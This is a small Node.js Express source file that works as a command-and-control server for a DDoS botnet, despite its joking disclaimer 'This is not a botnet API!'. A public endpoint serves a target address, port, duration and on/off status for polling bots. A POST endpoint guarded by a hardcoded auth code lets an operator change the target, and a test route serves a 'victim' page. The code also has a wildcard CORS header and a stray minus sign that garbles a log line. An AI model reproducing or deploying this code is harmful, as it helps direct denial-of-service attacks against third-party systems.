//Tim's express web app that doesnt do anything yet

var express = require('express');
var app = express();
var bodyparser = require('body-parser');

app.use(bodyparser.json());
app.use(bodyparser.urlencoded({extended: true}));
app.use('/assets', express.static('static'));

const AUTHCODE = "98frayw4fa4hw";

var status = "0";
var target = "0.0.0.0";
var port = "80";
var time = "5";

app.all('/*', function(req, res, next) {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Content-Type,X-Requested-With');
    next();
});

app.get('/api', function (req, res) {
	res.send({
		'status': status,
		'target': target,
		'port': port,
		'time': time
	});
});

app.get('/ui', function (req, res) {
	res.sendFile(__dirname + "/static/form.html");
});

app.get('/', function (req, res) {
	res.send('Welcome! This is not a botnet API!');
});

app.get('/test', function (req, res) {
	res.sendFile(__dirname + "/static/testVictim.html");
});

app.post('/api/post', function (req, res) {

	if (req.body.auth == AUTHCODE){

		if (req.body.status == undefined){
			status = 0;
		}else{
			status = req.body.status;
		}
		target = req.body.target;
		port = req.body.port;
		time = req.body.time;

		console.log('API POST recieved, \n     Status: ' + status +
		'\n     Target: ' + target +
		'\n     Port: ' + port +
		'\n     Time: ' + time
		);
	res.send('recieved');
	} else{
	console.log('Post recieved with bad auth:\n     '
	+ req.body.auth +
	-'\n     From: ' + req.ip);
	res.send('bad auth');
	}

});

var server = app.listen(3000, function () {
	var host = server.address().address;
	var port = server.address().port;
	console.log('Example app listening at http://%s:%s', host, port);
});
